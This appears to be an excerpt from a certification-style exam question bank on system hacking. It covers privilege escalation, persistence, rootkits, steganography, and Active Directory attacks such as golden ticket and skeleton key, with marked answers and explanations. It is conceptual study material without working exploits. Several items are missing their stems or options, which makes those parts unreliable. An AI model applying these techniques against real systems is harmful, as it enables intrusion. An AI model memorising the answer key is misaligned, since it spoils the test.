> + SID-History Injection: Attackers abuse Windows Security Identifier (SID) feature to inject the SID value of an administrator or equivalent account containing higher privileges into the compromised user account’s SID-history attribute.
> + Abusing SUID and SGID permissions: Set User Identification (SUID) and Set Group Identification (SGID) are access permissions given to a program file in UNIX-based systems. In Linux, there are some commands and binaries that can be executed by the attackers to elevate their privileges from non-root users to root users, if flags of SUID and SGID rights are set.
> + **Parent PID Spoofing:** Attackers attempt to bypass the internal process or service that tracks security measures and to escalate privileges by spoofing the parent process ID (PPID) of a recently added process. These new processes are derived directly from their parent if they are not specified precisely. An explicit specification can be made by providing a PPID for the new process via the CreateProcess API. Usually, this API call process consists of specific arguments to determine the particular PPID to be used. The appropriate PPID can be set to the process that is derived from the system through system processes such as svchost.exe or consent.exe using Windows User Account Control (UAC).
> + Access token manipulation: In Windows OSs, access tokens are used to determine the security context of a process or thread. Windows administrators have to log on as normal users and need to run their tools with admin privileges using token manipulation command “runas.” Attackers can exploit this to access the tokens of other users, or generate spoofed tokens, to escalate privileges and perform malicious activities while evading detection.

325. Malcolm, a professional hacker, targeted a Windows-based system to gain backdoor access. For this purpose, he escalated privileges by replacing the Windows App switcher accessibility feature with cmd.exe to gain backdoor access when a key combination is pressed at the login screen.
	Identify the Windows accessibility feature exploited by Malcolm in the above scenario.
+ [ ] C:\Windows\System32\Magnify.exe
+ [ ] C:\Windows\System32\sethc.exe
+ [x] C:\Windows\System32\AtBroker.exe
+ [ ] C:\Windows\System32\osk.exe
> **Explanation:**
> In a Windows environment, accessibility features are stored at the location **C:\Windows\System32\** and can be launched by pressing specific keys during a system reboot. Attackers gain escalated privileges by replacing one of the accessibility features with cmd.exe or by replacing binaries in the registry to gain backdoor access when a key combination is pressed at the login screen. This technique allows attackers to obtain system-level access.
> 
> The following are accessibility features abused by attackers:
> | Accessibility Feature | Path                                  |
> |-----------------------|---------------------------------------|

+ [ ] `crontab -r`
+ [x] `crontab -e`
+ [ ] `crontab -r <Username>`
+ [ ] `crontab -l`
> **Explanation:**
> Attackers escalate system privileges by making changes to the scripts executed by **cron** located at **/etc/crontab**. By modifying these scripts, attackers can force malicious scripts to be executed automatically during system reboot for gaining root privileges.
> 
> | Command                    | Description                                                              |

327. Which of the following techniques is used to place an executable in a particular path in such a way that it will be executed by the application in place of the legitimate target?
+ [ ] Application shimming
+ [ ] File system permissions weakness
+ [ ] Scheduled task
+ [x] Path interception
> **Explanation:**
> Path interception is a method of placing an executable in a particular path in such a way that it will be executed by the application in place of the legitimate target. Attackers can take advantage of several flaws or misconfigurations to perform path interception like unquoted paths (service paths and shortcut paths), path environment variable misconfiguration, and search order hijacking. Path interception helps an attacker to maintain persistence on a system and escalate privileges.

328. A pen tester is using Metasploit to exploit an FTP server and pivot to a LAN. How will the pen tester pivot using Metasploit?
+ [ ] Set the payload to propagate through the meterpreter.
+ [x] Create a route statement in the meterpreter.
+ [ ] Reconfigure the network settings in the meterpreter.
+ [ ] Issue the pivot exploit and set the meterpreter.
> **Explanation:**

329. Which of the following operating systems allows loading of weak dylibs dynamically that is exploited by attackers to place a malicious dylib in the specified location?
+ [ ] Unix
+ [ ] Linux
+ [ ] Android
+ [x] macOS
> **Explanation:**
> macOS provides several legitimate methods, such as setting the DYLD_INSERT_LIBRARIES environment variable, which are user specific. These methods force the loader to automatically load malicious libraries into a target running process. macOS allows the loading of weak dylibs (dynamic libraries) dynamically, which in turn allows an attacker to place a malicious dylib in the specified location.

330. Which of the following techniques allows attackers to inject malicious script on a web server to maintain persistent access and escalate privileges?
+ [ ] Launch daemon
+ [x] Web shell
+ [ ] Access token manipulation
+ [ ] Scheduled task
> **Explanation:**
> + Scheduled task: The Windows operating system includes utilities such as “at” and “schtasks.” A user with administrator privileges can use these utilities in conjunction with the task scheduler to schedule programs or scripts that can be executed at a particular date and time. If a user provides proper authentication, he can also schedule a task from a remote system using RPC. An attacker can use this technique to execute malicious programs at system startup, maintain persistence, perform remote execution, escalate privileges, etc.
> + **Web shell:** A web shell is a web-based script that allows access to a web server. Web shells can be created in all the operating systems like Windows, Linux, MacOS, and OS X. Attackers create web shells to inject malicious script on a web server to maintain persistent access and escalate privileges. Attackers use a web shell as a backdoor to gain access and control a remote server. Generally, a web shell runs under current user’s privileges. Using a web shell an attacker can perform privilege escalation by exploiting local system vulnerabilities. After escalating the privileges, an attacker can install malicious software, change user permissions, add or remove users, steal credentials, read emails, etc.
> + Launch daemon: At the time of MacOS and OS X booting process, launchd is executed to complete the system initialization process. Parameters for each launch-on-demand system-level daemon found in /System/Library/LaunchDaemonsand/Library/LaunchDaemons are loaded using launchd. These daemons have property list files (plist) that are linked to executables that run at the time of booting. Attackers can create and install a new launch daemon, which can be configured to execute at boot-up time using launchd or launchctl to load plist into concerned directories. The weak configurations allow an attacker to alter the existing launch daemon’s executable to maintain persistence or to escalate privileges.
> + Access token manipulation: In Windows operating system, access tokens are used to determine the security context of a process or thread. These tokens include the access profile (identity and privileges) of a user associated with a process. After a user is authenticated, the system produces an access token. Every process the user executes makes use of this access token. The system verifies this access token when a process is accessing a secured object.

331. Which of the following vulnerabilities is found in all the Intel processors and ARM processors deployed by Apple (and others) and leads to tricking a process to access out of bounds memory by exploiting CPU optimization mechanisms such as speculative execution?
+ [ ] Dylib hijacking
+ [ ] DLL hijacking
+ [ ] Privilege escalation
+ [x] Meltdown
> **Explanation:**
> + Privilege escalation: In a privilege escalation attack, attackers first gain access to the network using a non-admin user account, and then try to gain administrative privileges. Attackers take advantage of design flaws, programming errors, bugs, and configuration oversights in the OS and software application to gain administrative access to the network and its associated applications.
> + Dylib hijacking: OS X similar to windows is vulnerable to dynamic library attacks. OS X provides several legitimate methods such as setting the DYLD_INSERT_LIBRARIES environment variable, which are user specific. These methods force the loader to load malicious libraries automatically into a target running process. OS X allows loading of weak dylibs (dynamic library) dynamically, which allows an attacker to place a malicious dylib in the specified location. In many cases, the loader searches for dynamic libraries in multiple paths. This helps an attacker to inject a malicious dylib in one of the primary directories and simply load the malicious dylib at runtime. Attackers can take advantage of such methods to perform various malicious activities such as stealthy persistence, run-time process injection, bypassing security software, bypassing Gatekeeper, etc.
> + **Meltdown**: Meltdown vulnerability is found in all the Intel processors and ARM processors deployed by Apple. This vulnerability leads to tricking a process to access out of bounds memory by exploiting CPU optimization mechanisms such as speculative execution. For example, an attacker requests to access an illegal memory location. He/she sends a second request to conditionally read a valid memory location. In this case, the processor using speculative execution will complete evaluating the result for both requests before checking the first request. When the processor checks that the first request is invalid, it rejects both the requests after checking privileges. Even though the processor rejects both the requests, the result of both the requests remains in the cache memory. Now the attacker sends multiple valid requests to access out of bounds` memory locations.
> + DLL hijacking: Most Windows applications do not use the fully qualified path when loading an external DLL library; instead, they first search the directory from which they have been loaded. Taking this as an advantage, if attackers can place a malicious DLL in the application directory, the application will execute the malicious DLL in place of the real DLL.

332. Don, a professional hacker, targeted a Windows-based system to implant a fake domain controller (DC). To achieve his goal, he modified the configuration settings of domain policies to perform unintended activities such as creating a new account, disabling or modifying internal tools, ingress tool transfer, unwanted service executions, and extracting passwords in plaintext.

+ [ ] `C:\Windows\system32>nltest/domain_trusts`
+ [x] `\<DOMAIN>\SYSVOL\<DOMAIN>\`
+ [ ] `C:\Windows\System32\osk.exe`
+ [ ] `C:\Windows\Panther\ UnattendGC\`
> **Explanation:**
> + **C:\Windows\system32>nltest /domain_trusts:** Attackers use this utility to collect information about trust domains and use the gathered information to add a domain trust or modify the settings of existing domain trusts to escalate privileges through Kerberoasting and pass-the-ticket attacks.
> + **C:\Windows\Panther\ UnattendGC\:** Unattended installs allow attackers to deploy Windows OSs without the intervention of an administrator. In Windows systems, the Unattend.xml file is stored in the above location.
> + **\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\****:** Attackers use this path to access the domain group policies and modify them to perform unintended activities such as creating a new account, disabling or modifying internal tools, ingress tool transfer, unwanted service executions, and modifying the policy to extract passwords in plaintext.
> + **C:\Windows\System32\osk.exe:** Attackers create persistence and escalate privileges by embedding and running malicious code within Windows accessibility features. On-screen keyboard is an accessibility feature abused by attackers.

333. Which of the following terms refers to a unique value assigned to each user and group account issued by the domain controller (DC) at the time of creation?
+ [ ] Basic service set identifier (BSSID)
+ [ ] Service set identifier (SSID)
+ [ ] Uniform Resource Identifier (URI)
+ [x] Security Identifier (SID)
> **Explanation:**
> + **Security Identifier (SID):** In Windows, Windows Security Identifier (SID) is a unique value assigned to each user and group accounts issued by the domain controller (DC) at the time of creation.
> + Service set identifier (SSID): An SSID is a 32-alphanumeric-character unique identifier given to a wireless local area network (WLAN) that acts as a wireless identifier of the network.
> + Uniform Resource Identifier (URI): A uniform resource identifier (URI) provides a means to identify a resource. It is a global identifier for Internet resources accessed remotely or locally.
> + Basic service set identifier (BSSID): It is the media access control (MAC) address of an access point (AP) or base station that has set up a basic service set (BSS).

> + rtgen: RainbowCrack is a general-purpose implementation that takes advantage of the time–memory trade-off technique to crack hashes. This project allows you to crack a hashed password. Attackers use the rtgen tool of this project to generate the rainbow tables.
> + CCleaner: CCleaner is a system optimization, privacy, and cleaning tool. It allows attackers to remove unused files and cleans traces of Internet browsing details from the target PC. With this tool, an attacker can very easily erase his/her tracks.
> + L0phtCrack: L0phtCrack is a tool designed to audit passwords and recover applications. It recovers lost Microsoft Windows passwords with the help of a dictionary, hybrid, rainbow table, and brute-force attacks, and it also checks the strength of the password.
> + **BeRoot**: BeRoot is a post-exploitation tool to check common misconfigurations to find a way to escalate privilege.

336. In which of the following techniques does an unauthorized user try to access the resources, functions, and other privileges that belong to the authorized user who has similar access permissions?
+ [ ] Kerberos authentication
+ [ ] Rainbow table attack
+ [x] Horizontal privilege escalation
+ [ ] Vertical privilege escalation
> **Explanation:**
> + Kerberos is a network authentication protocol that provides strong authentication for client/server applications by using secret-key cryptography. This provides mutual authentication, in that both the server and the user verify each other’s identity. Messages sent through Kerberos protocol are protected against replay attacks and eavesdropping.
> + **Horizontal Privilege Escalation**: In a horizontal privilege escalation, the unauthorize user tries to access the resources, functions, and other privileges that belong to the authorized user who has similar access permissions. For instance, online banking user A can easily access user B’s bank account.
> + A rainbow table attack is a type of cryptography attack where an attacker uses a rainbow table for reversing cryptographic hash functions. A rainbow table attack uses the cryptanalytic time memory trade-off technique, which requires less time than some other techniques. It uses already-calculated information stored in memory to crack the cryptography. In the rainbow table attack, the attacker creates a table of all the possible passwords and their respective hash values, known as a rainbow table, in advance.
> + Vertical Privilege Escalation: In a vertical privilege escalation, the unauthorized user tries to gain access to the resources and functions of the user with higher privileges, such as application or site administrators. For example, someone performing online banking can access the site using administrative functions.

348. Ben, a professional hacker, is performing attacks on a target organization. In this process, he performed a steganography attack with a known stego-object, steganography tool, and algorithm used to hide the message.
	Which of the following types of steganography attacks did Ben perform on the target organization?
+ [ ] Chosen-message attack
+ [ ] Stego-only attack
+ [ ] Chi-square attack
+ [x] Chosen-stego attack
> **Explanation:**
> + Stego-only attack: In a stego-only attack, the steganalyst or attacker does not have access to any information except the stego-medium or stego-object. In this attack, the steganalyst must try every possible steganography algorithm and related attack to recover the hidden information
> + Chosen-message attack: The steganalyst uses a known message to generate a stego-object by using various steganography tools to find the steganography algorithm used to hide the information. The goal in this attack is to determine patterns in the stego-object that may point to the use of specific steganography tools or algorithms
> + **Chosen-stego attack**: The chosen-stego attack takes place when the steganalyst knows both the stego-object and steganography tool or algorithm used to hide the message.
> + Chi-square attack: The chi-square method is based on probability analysis to test whether a given stego-object and the original data are the same or not. If the difference between both is nearly zero, then no data are embedded; otherwise, the stego-object includes embedded data inside

349. Fill in the blank. A _________________ is the type of rootkit most difficult to detect.
+ [x] Kernel-level rootkit
+ [ ] Hypervisor rootkit
+ [ ] Application rootkit
+ [ ] Hardware/firmware rootkit
> **Explanation:**
> + Hardware/firmware rootkit: Uses device/platform firmware to create persistent malware image in hardware, such as HDD, system BIOS, network card. Code integrity tool does not inspect the integrity of firmware.
> + Application rootkit: This replaces standard application files by modifying behavior of present applications with patches, injected malicious code.
> + Hypervisor rootkit: The hypervisor hosts operating system of the target machine as a virtual machine and intercepts all hardware calls made by the target operating system.
> + **Kernel-level rootkit:** The kernel is the core of the operating system. Kernel-level rootkit runs in Ring-0 with highest operating system privileges. These cover backdoors on the computer and are created by writing additional code or by substituting portions of kernel code with modified code via device drivers in Windows or loadable kernel modules in Linux. If the kit’s code contains mistakes or bugs, kernel-level rootkits affect the stability of the system. These have the same privileges of the operating system; hence, they are difficult to detect and intercept or subvert the operations of operating systems.

350. Which one of the following techniques is used by attackers to hide their programs?
+ [ ] Scanning
+ [ ] Enumeration
+ [x] NTFS stream
+ [ ] Footprinting
> **Explanation:**
> + Scanning: Scanning is the process of gathering additional detailed information about the target by using highly complex and aggressive reconnaissance techniques. Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network. It is one of the most important phases of intelligence gathering for an attacker which enables him/her to create a profile of the target organization.
> + **NTFS Stream:** Using NTFS data steam, an attacker can almost completely hide files within the system. It is easy to use the streams but the user can only identify it with specific software. Explorer can display only the root files; it cannot view the streams linked to the root files and cannot define the disk space used by the streams. As such, if a virus implants itself into ADS, it is unlikely that usual security software will identify it.
> + Enumeration: Enumeration is the process of extracting user names, machine names, network resources,shares, and services from a system or network. In the enumeration phase, attacker creates active connections with system and performs directed queries to gain more information about the target. The attackers use the information collected by means of enumeration to identify the vulnerabilities or weak points in the system security, which helps them exploit the target system.
> + Footprinting: Footprinting, the first step in ethical hacking, refers to the process of collecting information about a target network and its environment. Using footprinting, you can find a number of opportunities to penetrate and assess the target organization’s network.

351. Which type of rootkit is created by attackers by exploiting hardware features such as Intel VT and AMD-V?
+ [ ] Hardware/firmware rootkit
+ [x] Hypervisor level rootkit
+ [ ] Boot loader level rootkit
+ [ ] Kernel level rootkit
> **Explanation:**
> + **Hypervisor Level Rootkit**: Attackers create Hypervisor level rootkits by exploiting hardware features such as Intel VT and AMD-V. These rootkits runs in Ring-1 and host the operating system of the target machine as a virtual machine and intercept all hardware calls made by the target operating system. This kind of rootkit works by modifying the system’s boot sequence and gets loaded instead of the original virtual machine monitor.
> + Hardware/Firmware Rootkit: Hardware/firmware rootkits use devices or platform firmware to create a persistent malware image in hardware, such as a hard drive, system BIOS, or network card. The rootkit hides in firmware as the users do not inspect it for code integrity. A firmware rootkit implies the use of creating a permanent delusion of rootkit malware.
> + Kernel Level Rootkit: The kernel is the core of the operating system. Kernel level rootkit runs in Ring-0 with highest operating system privileges. These cover backdoors on the computer and are created by writing additional code or by substituting portions of kernel code with modified code via device drivers in Windows or loadable kernel modules in Linux.
> + Boot Loader Level Rootkit: Boot loader level (bootkit) rootkits function either by replacing or modifying the legitimate bootloader with another one. The boot loader level (bootkit) can activate even before the operating system starts. So, the boot-loader level (bootkit) rootkits are serious threats to security because they can help in hacking encryption keys and passwords.

352. In which of the following techniques is the text or an image considerably condensed in size, up to one page in a single dot, to avoid detection by unintended recipients?
+ [ ] Spread spectrum
+ [ ] Computer-based methods
+ [ ] Invisible ink
+ [x] Microdots
> **Explanation:**
> + **Microdots**: A microdot is text or an image considerably condensed in size (with the help of a reverse microscope), up to one page in a single dot, to avoid detection by unintended recipients. Microdots are usually circular, about one millimeter in diameter, but are changeable into different shapes and sizes.
> + Computer-based methods: A computer-based method makes changes to digital carriers to embed information foreign to the native carriers. Communication of such information occurs in the form of text, binary files, disk and storage devices, and network traffic and protocols, and can alter the software, speech, pictures, videos or any other digitally represented code for transmission.
> + Invisible ink: Invisible ink, or “security ink,” is one of the methods of technical steganography. It is used for invisible writing with colorless liquids and can later be made visible by certain pre-negotiated manipulations such as lighting or heating. For example, if you use onion juice and milk to write a message, the writing will be invisible, but when heat is applied, it turns brown and the message becomes visible.
> + Spread spectrum: This technique is less susceptible to interception and jamming. In this technique, communication signals occupy more bandwidth than required to send the information. The sender increases the band spread by means of code (independent of data), and the receiver uses a synchronized reception with the code to recover the information from the spread spectrum data.

The PoisonIvy remote administration tool is created and controlled by a PoisonIvy management program or kit. The PoisonIvy kit consists of a graphical user interface, and the backdoors are small (typically, <10 kB).
> + Necurs: The Necurs botnet is a distributor of many pieces of malware, most notably Dridex and Locky. It delivers some of the worst banking Trojans and ransomware threats in batches of millions of emails at a time, and it keeps reinventing itself. Necurs is distributed by spam e-mails and downloadable content from questionable/illegal sites. It is indirectly responsible for a significant portion of cyber-crime.
> + **Purple Fox Rootkit:** The Purple Fox rootkit enables attackers to conceal malware on targeted devices, making it difficult for security solutions to detect and remove the malware. It is a sophisticated malware attack that targets Windows machines and spreads its infection from one machine to another. The Purple Fox rootkit can be distributed via a fake malicious Telegram installer.

+ [ ] Steganography
+ [ ] Steganalysis
> **Explanation:**
> + Steganography: Steganography refers to the art of hiding data “behind” other data without the knowledge of the victim.
> + Kernel Exploits: Kernel exploits refer to programs that can exploit vulnerabilities present in the kernel to execute arbitrary commands or code with higher privileges.
> + Steganalysis: Steganalysis is the process of discovering the existence of hidden information in a medium. It is the reverse process of steganography.
> + **Domain Dominance**: Domain dominance is a process of taking control over critical assets such as domain controllers (DCs) on a target system and gaining access to other networked resources.

356. Which of the following is a form of malware that attackers use to inject false credentials into domain controllers (DCs) to create a backdoor password?
+ [ ] NTFS data stream
+ [x] Skeleton key
+ [ ] Spyware
+ [ ] Keylogger
> **Explanation:**
> + NTFS Data Stream: NTFS is a filesystem that stores a file with the help of two data streams, called NTFS data streams, along with the file attributes.
> + Keylogger: Keyloggers are software programs or hardware devices that record the keys struck on the computer keyboard (also called keystroke logging) of an individual computer user or a network of computers.
> + Spyware: Spyware is stealthy computer monitoring software that allows you to secretly record all the user activities on a target computer. It automatically delivers logs to the remote attacker using the Internet (via email, FTP, command and control through encrypted traffic, HTTP, DNS, etc.).
> + **Skeleton Key Attack:** A skeleton key is a form of malware that attackers use to inject false credentials into domain controllers (DCs) to create a backdoor password. It is a memory-resident virus that enables an attacker to obtain a master password to validate themselves as a legitimate user in the domain.

357. Don, a professional hacker, compromised a legitimate user’s privileges to gain control over the Active Directory (AD) environment. Using the privileges, he further compromised the KRBTGT service and obtained a password hash to forge TGTs. Using the forged TGTs, Don impersonated a legitimate user and gained access to other resources.
	Identify the attack performed by Don in the above scenario.
+ [ ] Directory traversal attack
+ [ ] Mask attack
+ [x] Golden ticket attack
+ [ ] Insertion attack
> **Explanation:**
> + **Golden Ticket Attack:** A golden ticket attack is a post-exploitation technique implemented by attackers to gain complete control over the entire AD. Attackers perform this attack by leveraging the Kerberos authentication protocol, using which they forge Ticket Granting Tickets (TGTs) by compromising a Key Distribution Service account (KRBTGT) to access various resources. This attack allows attackers to maintain persistence and obtain more information within the AD by masquerading as privileged users.
> + Insertion Attack: Insertion is the process by which the attacker confuses the IDS by forcing it to read invalid packets (i.e., the system may not accept the packet addressed to it). An IDS blindly trusts and accepts a packet that an end system rejects.
> + Directory Traversal Attack: An attacker may be able to perform a directory traversal attack owing to a vulnerability in the code of a web application. In addition, poorly patched or configured web server software can make the web server vulnerable to a directory traversal attack.
> + Mask Attack: Mask attack is similar to brute-force attacks but recovers passwords from hashes with a more specific set of characters based on information known to the attacker.

358. Joseph, a professional hacker, was tasked with compromising the security of an organization's Active Directory (AD) environment. After gaining access to the target host, Joseph abused the SDProp process to establish persistence. Further, he added a new user account to the ACL to gain GenericAll privileges, which are equivalent to the privileges of the domain administrator.
	Which of the following attacks did Joseph perform in the above scenario?
+ [x] Domain persistence through AdminSDHolder
+ [ ] Cross-site scripting (XSS) attack
+ [ ] Rainbow table attack
+ [ ] Persistence by abusing boot or logon autostart executions
> **Explanation:**
> + Rainbow Table Attack: A rainbow table attack uses the cryptanalytic time–memory trade-off technique, which requires less time than other techniques.
> + Cross-Site Scripting (XSS) Attack: In this method, an attacker injects HTML tags or scripts into a target website.
> + **Maintain Domain Persistence Through AdminSDHolder:** Attackers having admin privileges on a compromised domain can abuse the SDProp process to establish persistence. Attackers can add a user account to the ACL to gain “GenericAll” privileges, equivalent to the domain administrator. Consequently, with the changes replicated every hour by SDProp, attackers can maintain persistence.
> + Maintain persistence by Abusing Boot or Logon Autostart Executions: Attackers take advantage of the system boot or logon autostart programs for escalating privileges and performing persistent attacks by applying custom configuration settings on the compromised machine.

359. Which of the following is a PowerShell toolset for building malicious WMI event subscriptions?

The user hides the data in the text file by appending sequences of up to seven spaces, interspersed with tabs. This usually allows three bits to be stored every eight columns. There is an alternative encoding scheme that uses alternating spaces and tabs to represent 0s and 1s.

366. In the options given below; identify the nature of a library-level rootkit?
+ [ ] Operates inside the victim’s computer by replacing the standard application files
+ [ ] Functions either by replacing or modifying the legitimate bootloader with another one
+ [x] Works higher up in the OS and usually patches, hooks, or supplants system calls with backdoor versions
+ [ ] Uses devices or platform firmware to create a persistent malware image in hardware
> **Explanation:**
> + Application Level Rootkit: Application level rootkit operates inside the victim’s computer by replacing the standard application files (application binaries) with rootkits or by modifying behavior of present applications with patches, injected malicious code, and so on.
> + Boot Loader Level Rootkit: Boot loader level (bootkit) rootkits function either by replacing or modifying the legitimate bootloader with another one. The boot loader level (bootkit) can activate even before the operating system starts. So, the boot-loader level (bootkit) rootkits are serious threats to security because they can help in hacking encryption keys and passwords.

> + Hardware/Firmware Rootkit: Hardware/firmware rootkits use devices or platform firmware to create a persistent malware image in hardware, such as a hard drive, system BIOS, or network card. The rootkit hides in firmware as the users do not inspect it for code integrity. A firmware rootkit implies the use of creating a permanent delusion of rootkit malware.

367. Which of the following techniques refers to the art of hiding data “behind” other data without the target’s knowledge?
+ [ ] Enumeration
+ [x] Steganography
+ [ ] Footprinting
+ [ ] Scanning
> **Explanation:**
> + Scanning: Scanning is the process of gathering additional detailed information about the target by using highly complex and aggressive reconnaissance techniques. Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network. It is one of the most important phases of intelligence gathering for an attacker which enables him/her to create a profile of the target organization.
> + **Steganography**: Steganography refers to the art of hiding data “behind” other data without the target’s knowledge. Thus, Steganography hides the existence of the message. It replaces bits of unused data into the usual files such as graphic, sound, text, audio, video, etc. with some other surreptitious bits. The hidden data can be plaintext or ciphertext, or it can be an image.
> + Enumeration: Enumeration is the process of extracting user names, machine names, network resources,shares, and services from a system or network. In the enumeration phase, attacker creates active connections with system and performs directed queries to gain more information about the target. The attackers use the information collected by means of enumeration to identify the vulnerabilities or weak points in the system security, which helps them exploit the target system.
> + Footprinting: Footprinting, the first step in ethical hacking, refers to the process of collecting information about a target network and its environment. Using footprinting, you can find a number of opportunities to penetrate and assess the target organization’s network.

368. Which of the following is malicious code concealed within UEFI firmware in SPI flash, scheduled to be executed at a specific time?
+ [ ] GlitchPOS
+ [ ] Dreambot
+ [x] MoonBounce
+ [ ] Restorator
> **Explanation:**
> + Dreambot: Dreambot banking Trojans are also known as updated versions of Ursnif or Gozi. Dreambot Trojans have long been used by hackers, and they have been regularly updated with more sophisticated capabilities. They can be delivered through the Emotet dropper or RIG exploit kit. This Trojan can also be embedded as a macro in an MS word document and sent to victims via spam emails. If this Trojan gets into the victim’s machine, it will covertly create registry keys and processes, and attempt to connect to multiple malicious C2C servers.
> + **MoonBounce:** MoonBounce is malicious code concealed within UEFI firmware in the SPI flash that is scheduled to be executed at a specific time.

369. A technique allows attackers to conduct persistence attacks if they identify a service with all the necessary permissions that is connected with a registry key, and when any authorized user attempts to log in, the service link associated with the registry runs automatically. Identify this technique.
+ [ ] Abusing accessibility features
+ [ ] Abusing Data Protection API (DPAPI)
+ [ ] Abusing AdminSDHolder
+ [x] Abusing boot or logon autostart executions
> **Explanation:**
> + Abusing Data Protection API (DPAPI): DPAPI is a unified location in Windows environments where all the cryptographically secured files, passwords of browsers, and other critical data are stored. Windows domain controllers (DCs) contain a master key to decrypt DPAPI-protected files. Attackers often attempt to obtain this master key from the DC.
> + Abusing AdminSDHolder: AdminSDHolder is an object of AD that protects user accounts and groups having high privileges against accidental modifications of security permissions.
> + **Abusing Boot or Logon Autostart Executions**: Attackers can conduct persistence attacks or privilege escalation if they identify a service with all the necessary permissions that is connected with the registry key. When any authorized user attempts to log in, the service link associated with the registry runs automatically.
> + Abusing accessibility features: Attackers create persistence and escalate privileges by embedding and running malicious code within Windows accessibility features.

370. George, a professional hacker, compromised the target domain controller to maintain domain dominance. For this reason, he installed a memory-resident virus that injects false credentials into a DC to create a backdoor password. Using the virus, George obtained the master password to validate himself as a legitimate user in the domain.
	Which of the following attacks did George perform in the above scenario?
+ [ ] Dumpster diving
+ [ ] STP attack
+ [ ] Overpass-the-hash attack
+ [x] Skeleton key attack
> **Explanation:**
> + Overpass-the-Hash Attack: The overpass-the-hash (OPtH) attack is an extension of pass-the-ticket and pass-the-hash attacks. It is a type of credential theft-and-reuse attack using which attackers perform malicious activities on compromised devices or environments.
> + Dumpster Diving: “Dumpster diving” is a key attack method that employs significant failures in computer security in the target system.
> + STP Attack: In a Spanning Tree Protocol (STP) attack, attackers connect a rogue switch into the network to change the operation of the STP protocol and sniff all the network traffic. STP is used in LAN-switched networks with the primary function of removing potential loops within the network.
> + **Skeleton Key Attack:** A skeleton key is a form of malware that attackers use to inject false credentials into domain controllers (DCs) to create a backdoor password.

371. Which of the following is a post-exploitation technique implemented by an attacker to steal legitimate users’ credentials and create a fake Kerberos TGS to acquire permissions to only a single service in an application?
+ [ ] HTTP response-splitting attack
+ [x] Silver ticket attack
+ [ ] Password spraying attack
+ [ ] SSH brute-force attack
> **Explanation:**
> + Password Spraying Attack: Password spraying attack targets multiple user accounts simultaneously using one or a small set of commonly used passwords.
> + **Silver Ticket Attack:** A silver ticket attack is a post-exploitation technique implemented by an attacker to steal legitimate users’ credentials and create a fake Kerberos Ticket Granting Service (TGS) ticket. This attack allows an attacker to acquire permissions to only a single service in an application, unlike the golden ticket attack, in which the attackers acquire permissions over the entire AD. To initiate a silver ticket attack, the attacker must hold access to the credentials gathered from a local service account or the system’s SAM database. Then, the attacker forges or creates a silver ticket without any intermediary such as a domain controller (DC), which makes it easier for the attacker to intrude and become untraceable for monitoring solutions.
> + HTTP Response Splitting Attack: An HTTP response-splitting attack is a web-based attack in which the attacker tricks the server by injecting new lines into response headers, along with arbitrary code.
> + SSH Brute Force Attack: Attackers use SSH protocols to create an encrypted SSH tunnel between two hosts to transfer unencrypted data over an insecure network. Usually, SSH runs on TCP port 22. To perform an attack on SSH, an attacker scans the entire SSH server using bots (performs a port scan on TCP port 22) to identify possible vulnerabilities.

+ [ ] Video steganography
+ [ ] Image steganography
+ [x] Document steganography
+ [ ] Folder steganography
> **Explanation:**
> + Image Steganography: Image steganography allows you to conceal your secret message within an image. You can take advantage of the redundant bit of the image to conceal your message within it. These redundant bits are those bits of the image that have very little effect on the image, if altered. Detection of this alteration is not easy. You can conceal your information within images of different formats (e.g., .PNG, .JPG, .BMP).
> + **Document Steganography**: As with image steganography, document steganography is the technique of hiding secret messages transferred in the form of documents. It includes addition of white spaces and tabs at the end of the lines. Stego-document is a cover document comprising of the hidden message. Steganography algorithms, referred to as the “stego system, are employed for hiding the secret messages in the cover medium at the sender end. The same algorithm is used for extracting the hidden message from the stego-document by the recipient.
> + Folder Steganography: Folder steganography refers to hiding secret information in folders. Files are hidden and encrypted within a folder and are not seen by the normal Windows applications, including Windows Explorer.
> + Video Steganography: Video steganography refers to hiding secret information into a carrier video file. The information is hidden in video files of different formats such as .AVI, .MPG4, .WMV, etc. Discrete Cosine Transform (DCT) manipulation is used to add secret data at the time of the transformation process of the video.

381. Identify the technique used by the attackers to execute malicious code remotely?
+ [ ] Rootkits and steganography
+ [ ] Modify or delete logs
+ [x] Install malicious programs
+ [ ] Sniffing network traffic
> **Explanation:**
> + Executing Applications: Once attackers have administrator privileges, they attempt to install malicious programs such as Trojans, Backdoors, Rootkits, and Keyloggers, which grant them remote system access, thereby enabling them to execute malicious codes remotely. Installing Rootkits allows them to gain access at the operating system level to perform malicious activities. To maintain access for use at a later date, they may install Backdoors.
> + Hiding Files: Attackers use Rootkits and steganography techniques to attempt to hide the malicious files they install on the system, and thus their activities.
> + Covering Tracks: To remain undetected, it is important for attackers to erase all evidence of security compromise from the system. To achieve this, they might modify or delete logs in the system using certain log-wiping utilities, thus removing all evidence of their presence.
> + Gaining Access: In system hacking, the attacker first tries to gain access to a target system using information obtained and loopholes found in the system’s access control mechanism. Once attackers succeed in gaining access to the system, they are free to perform malicious activities such as stealing sensitive data, implementing a sniffer to capture network traffic, and infecting the system with malware. At this stage, attackers use techniques such as password cracking and social engineering tactics to gain access to the target system.

> **Explanation:**
> + Executing Applications: Once attackers have administrator privileges, they attempt to install malicious programs such as Trojans, Backdoors, Rootkits, and Keyloggers, which grant them remote system access, thereby enabling them to execute malicious codes remotely. Installing Rootkits allows them to gain access at the operating system level to perform malicious activities. To maintain access for use at a later date, they may install Backdoors.
> + Escalating Privileges: After gaining access to a system using a low-privileged normal user account, attackers may then try to increase their administrator privileges to perform protected system operations, so that they can proceed to the next level of the system hacking phase: to execute applications. Attackers exploit known system vulnerabilities to escalate user privileges.
> + Gaining Access: In system hacking, the attacker first tries to gain access to a target system using information obtained and loopholes found in the system’s access control mechanism. Once attackers succeed in gaining access to the system, they are free to perform malicious activities such as stealing sensitive data, implementing a sniffer to capture network traffic, and infecting the system with malware.
> + **Clearing Logs:** To maintain future system access, attackers attempt to avoid recognition by legitimate system users. To remain undetected, attackers wipe out the entries corresponding to their activities in the system log, thus avoiding detection by users.

+ [ ] Preparation
+ [ ] Persistence
+ [ ] Cleanup
> **Explanation:**
> + Preparation: The first phase of the APT lifecycle is preparation, where an adversary defines the target, performs extensive research on the target, organizes a team, builds or attains tools, and performs tests for detection.
